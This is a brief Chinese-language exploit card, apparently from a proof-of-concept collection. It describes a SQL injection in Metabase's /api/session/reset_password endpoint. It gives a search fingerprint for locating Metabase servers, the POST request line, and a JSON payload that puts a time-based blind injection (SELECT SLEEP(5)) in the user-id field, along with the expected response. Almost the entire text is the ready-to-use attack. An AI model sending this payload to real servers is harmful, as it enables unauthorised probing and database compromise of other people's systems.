# Metabasereset_password存在SQL注入漏洞

Metabasereset ｜ SQL注入 ｜ —
- **指纹**：`app="Metabase"`
- **请求**：`POST /api/session/reset_password HTTP/1.1`

**Payload**
```
"token": "1_aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
"password": "SuperComplex_P@ssw0rd_9!aB",
"user-id": {
"raw": "(SELECT 1 FROM (SELECT SLEEP(5)) t)"
}
```
- **响应特征**：200